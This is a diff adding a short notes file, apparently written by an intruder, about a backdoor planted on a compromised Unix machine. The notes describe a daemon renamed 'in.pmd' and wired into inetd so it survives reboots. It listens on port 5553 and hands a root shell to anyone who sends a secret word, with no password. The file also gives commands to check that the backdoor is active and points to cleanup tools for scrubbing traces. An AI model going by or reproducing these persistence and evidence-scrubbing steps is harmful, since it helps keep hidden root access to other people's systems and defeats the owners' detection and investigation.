@@ -1,0 +1,13 @@
+notes -- the door stays open
+
+* left the usual way back in.  sportd is renamed in.pmd now and wired into inetd
+  so it comes back on every reboot -- check:
+      grep pmd /etc/inetd.conf /etc/services
+      netstat -a | grep 5553
+
+* it's on a high port (5553).  knock with the word and you get root, no password:
+      telnet localhost 5553
+      <the word>            <- you know the word.  it's the same one as always.
+
+* runs as root out of inetd, so the shell it drops is root.  cleanup tools are
+  where they always are if you need to scrub after.
